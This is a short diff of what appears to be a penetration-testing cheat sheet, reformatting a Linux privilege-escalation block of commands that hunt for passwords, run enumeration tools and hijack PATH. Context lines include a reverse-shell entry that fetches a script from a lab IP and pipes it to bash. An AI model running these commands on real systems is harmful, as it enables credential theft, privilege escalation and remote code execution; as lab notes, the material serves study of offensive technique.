@@ -12,14 +12,14 @@ dir \ /s/b | find ""
 findstr /sp administrator *
 ```
 ### linux
-    ```
-    sudo -l
-    linpeas
-    pspy64
-    find / -type f -newermt "2019-05-05" ! -newermt "2019-05-26" -ls 2>/dev/null
-    grep -R -i passwd,password,db_passwd,db_pass
-    export PATH=.:$PATH
-    ```
+```
+sudo -l
+linpeas
+pspy64
+find / -type f -newermt "2019-05-05" ! -newermt "2019-05-26" -ls 2>/dev/null
+grep -R -i passwd,password,db_passwd,db_pass
+export PATH=.:$PATH
+```
 ## reverseshell
   ```
   wget -O - 10.10.14.6/shell.sh | bash
